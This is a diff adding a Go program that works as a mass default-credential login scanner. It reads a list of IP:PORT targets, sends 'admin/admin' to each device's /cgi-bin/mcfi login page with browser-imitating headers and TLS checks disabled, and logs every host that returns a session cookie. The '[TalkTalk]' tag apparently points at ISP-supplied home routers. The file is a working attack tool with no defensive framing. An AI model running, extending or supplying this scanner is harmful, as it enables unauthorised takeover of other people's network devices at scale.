@@ -1,0 +1,111 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+    "net"
+    "crypto/tls"
+)
+
+const requestTimeout = 7 * time.Second
+
+func main() {
+
+	ips, err := readIPsFromFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading IP:PORT combinations from ips.txt:", err)
+		return
+	}
+
+	cookieFile, err := os.OpenFile("cookie.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
+	if err != nil {
+		fmt.Println("Error opening cookie.txt for writing:", err)
+		return
+	}
+	defer cookieFile.Close()
+
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{
+		Transport: tr,
+		Timeout:   requestTimeout,
+	}
+
+	for _, ipPort := range ips {
+
+		requestBody := strings.NewReader("username=admin&password=admin")
+
+		req, err := http.NewRequest("POST", "http://"+ipPort+"/cgi-bin/mcfi", requestBody)
+		if err != nil {
+			fmt.Println("Error creating request:", err)
+			continue 
+		}
+
+		req.Header.Set("Host", ipPort)
+		req.Header.Set("Cache-Control", "max-age=0")
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("Origin", "http://"+ipPort)
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Referer", "http://"+ipPort+"/cgi-bin/mcfi")
+		req.Header.Set("Accept-Encoding", "gzip, deflate, br")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Connection", "close")
+		req.Header.Set("Content-Length", "29")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			if isTimeoutError(err) {
+				//fmt.Printf("Timed out for %s. Skipping...\n", ipPort)
+				continue 
+			}
+			//fmt.Println("Error sending request:", err)
+			continue 
+		}
+		defer resp.Body.Close()
+
+		setCookie := resp.Header.Get("Set-Cookie")
+		if setCookie != "" {
+			fmt.Printf("[TalkTalk] cookie successfully found in device: %s\n", ipPort)
+
+			// Write the successful login IP:PORT to cookie.txt
+			_, err := cookieFile.WriteString(ipPort + "\n")
+			if err != nil {
+				fmt.Println("Error writing to cookie.txt:", err)
+			}
+		} else {
+			fmt.Printf("[TalkTalk] failed to find cookie in device: %s\n", ipPort)
+		}
+	}
+}
+
+func readIPsFromFile(filename string) ([]string, error) {
+	var ips []string
+
+	file, err := os.Open(filename)
+	if err != nil {
+		return ips, err
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ips = append(ips, scanner.Text())
+	}
+	if err := scanner.Err(); err != nil {
+		return ips, err
+	}
+
+	return ips, nil
+}
+
+func isTimeoutError(err error) bool {
+	netErr, isNetErr := err.(net.Error)
+	return isNetErr && netErr.Timeout()
+}
